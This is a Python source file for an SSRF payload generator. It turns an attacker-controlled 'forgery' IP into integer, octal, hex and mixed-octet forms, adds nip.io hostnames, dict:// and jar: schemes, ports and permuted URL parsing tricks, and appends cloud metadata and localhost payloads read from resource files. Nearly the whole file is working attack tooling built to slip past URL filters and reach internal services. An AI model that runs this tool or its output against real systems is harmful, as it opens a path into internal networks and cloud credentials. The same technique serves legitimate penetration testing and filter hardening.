import socket
import pathlib
import binascii
import os
import requests
import re
import itertools

from functools import reduce
from operator import add
from datetime import datetime
from common.logger import get_logger
from payload_generator.register import Register


class PayloadGenerator:

    register = Register()

    def __init__(self, target_addr, forgery_addr=None, save_path='./payloads', payload_filename=None, protocols=['http','https','dict'], ports=['22', '80', '443']):
        self.target_addr = target_addr
        self.forgery_addr = forgery_addr
        self.save_path = save_path
        self.payload_filename = payload_filename
        self.logger = get_logger()

        self.protocols = protocols
        self.ports = ports
        self.ip_formats_path = str(pathlib.Path(__file__).parent.absolute()) + '/resources/ip_formats.txt'
        self.localhost_formats_path = str(pathlib.Path(__file__).parent.absolute()) + '/resources/localhost_formats.txt'
        self.format_strings_path = str(pathlib.Path(__file__).parent.absolute()) + '/resources/format_strings.txt'
        self.cloud_payloads_path = str(pathlib.Path(__file__).parent.absolute()) + '/resources/cloud_payloads.txt'
        self.localhost_payloads_path = str(pathlib.Path(__file__).parent.absolute()) + '/resources/localhost_payloads.txt'

        if self.forgery_addr is None:
            self.forgery_ip = requests.get('https://checkip.amazonaws.com').text.strip()
            try:
                self.forgery_addr = self.get_addr_from_ip(self.forgery_ip)
            except socket.gaierror:
                self.logger.warning('DNS problem or there is no domain name connected with own public IP')
                self.forgery_addr
        else:
            try:
                self.forgery_ip = self.get_ip_from_addr(self.forgery_addr)
            except socket.gaierror:
                self.logger.warning('Wrong forgery address format or DNS problem')
                self.forgery_ip = None
        
        try:
            self.target_ip = self.get_ip_from_addr(self.target_addr)
        except socket.gaierror:
            self.logger.warning('Cannot obtain IP for target address')
            self.target_ip = None

        if not os.path.isdir(self.save_path):
            os.mkdir(self.save_path)

    def get_ip_from_addr(self, hostname):
        return socket.gethostbyname(hostname)

    def get_addr_from_ip(self, ip):
        return socket.gethostbyaddr(ip)[0]

    def create_every_ip_format(self):
        forgery_payloads = [self.forgery_addr, self.forgery_ip]

        try:
            for func in self.register:
                forgery_payloads += func(self)
        except:
            self.logger.warning("During creation of entry payloads something went wrong, gl & hf debugging")

        formatted_payloads = self.create_parsing_tricks(forgery_payloads)
        forgery_payloads += [self.add_port(port, addr) for addr in forgery_payloads for port in self.ports]
        forgery_payloads += formatted_payloads
        forgery_payloads += self.add_cloud_payloads()
        forgery_payloads += [self.add_protocol(protocol, addr) for addr in forgery_payloads for protocol in self.protocols]
        forgery_payloads += [self.add_jar_protocol(addr) for addr in forgery_payloads]
        forgery_payloads += self.add_localhost_payloads()

        return forgery_payloads

    def add_protocol(self, protocol, addr):
        return protocol + '://' + addr

    def add_port(self, port, addr):
        return addr + ':' + port

    def add_jar_protocol(self, addr):
        return 'jar:' + addr

    @register
    def ip_to_int(self):
        return [str(reduce(add, [ int(octet) * (256 ** i) for i, octet in enumerate(reversed(self.forgery_ip.split('.'))) ]))]

    @register
    def ip_to_octal(self):
        return ['%04o.%04o.%04o.%04o' % tuple(map(int, self.forgery_ip.split('.')))]

    @register
    def ip_to_hex(self):
        return ['0x' + binascii.hexlify(socket.inet_aton(self.forgery_ip)).decode('utf-8')]

    @register
    def create_ip_formats_from_file(self):
        with open(self.ip_formats_path, 'r') as f:
            formats = f.read().splitlines()
        
        created_formats = []
        for octet_format in formats:
            types = octet_format.split(',')
            created_formats.append(self.create_mixed_ip(types))
        return created_formats

    @register
    def create_nipio_format(self):
        if self.target_addr is not None:
            return [
                self.target_addr + '.127.0.0.1.nip.io', 
                self.target_ip + '.127.0.0.1.nip.io',
                self.target_addr + '.' + self.forgery_ip + '.nip.io',
                self.target_ip + '.' + self.forgery_ip + '.nip.io'
            ]
        else:
            return [
                self.target_ip + '.127.0.0.1.nip.io',
                self.target_ip + '.' + self.forgery_ip + '.nip.io'
            ]

    @register
    def add_localhost_formats(self):
        with open(self.localhost_formats_path, 'r') as f:
            formats = f.read().splitlines()
        return formats

    def add_cloud_payloads(self):
        with open(self.cloud_payloads_path, 'r') as f:
            payloads = f.read().splitlines()
        return payloads

    def add_localhost_payloads(self):
        with open(self.localhost_payloads_path, 'r') as f:
            payloads = f.read().splitlines()
        return payloads

    def create_parsing_tricks(self, forgery_payloads):
        with open(self.format_strings_path, 'r') as f:
            formats = f.read().splitlines()
        forgery_payloads += [self.target_addr, self.target_ip]
        
        payloads = []
        permutations = {}
        for form in formats:
            amount = len(re.findall(r'{}', form))
            if str(amount) not in permutations:
                permutations[str(amount)] = list(itertools.permutations(forgery_payloads, amount))
            for permutation in permutations[str(amount)]:
                payloads.append(form.format(*permutation))
        
        return payloads

    def set_array(self, payload, position, amount):
        arr = [None] * amount
        arr[position] = payload
        for i in arr:
            if i is None:
                i = self.target
        
    def create_mixed_ip(self, octet_types):
        return (
            f'{self.octet_to_format(self.forgery_ip, 1, octet_types[0])}.'
            f'{self.octet_to_format(self.forgery_ip, 2, octet_types[1])}.'
            f'{self.octet_to_format(self.forgery_ip, 3, octet_types[2])}.'
            f'{self.octet_to_format(self.forgery_ip, 4, octet_types[3])}'
        )

    def octet_to_format(self, ip, octet, octet_format):
        return {
            'int': self.octet_to_int,
            'oct': self.octet_to_octal,
            'hex': self.octet_to_hex,
            'dot': self.octet_to_dot
        }[octet_format](ip, octet)

    def octet_to_int(self, ip, octet):
        return str((int(ip.split('.')[octet - 1]) * (256 ** abs(octet - 4))))

    def octet_to_octal(self, ip, octet):
        return '%04o' % int(ip.split('.')[octet - 1])

    def octet_to_hex(self, ip, octet):
        return hex(int(ip.split('.')[octet - 1]))

    def octet_to_dot(self, ip, octet):
        return ip.split('.')[octet - 1]

    def save_to_file(self, payloads):
        full_path = self.get_fullpath()
        with open(full_path, 'w+') as f:
            for payload in payloads:
                f.write(payload + '\n')

    def get_fullpath(self):
        now = datetime.now()
        today_folder = self.get_today_folder(now)

        if self.payload_filename is not None:
            return f"{today_folder}/{self.payload_filename}"
        else:
            return f"{today_folder}/{now.strftime('%H%M%S_payloads.txt')}"

    def get_today_folder(self, now):
        today_folder = f"{self.save_path}/{now.strftime('%Y%m%d')}"
        if not os.path.isdir(today_folder):
            os.mkdir(today_folder)
        return today_folder

    def run(self):
        forgery_payloads = self.create_every_ip_format()
        self.save_to_file(forgery_payloads)


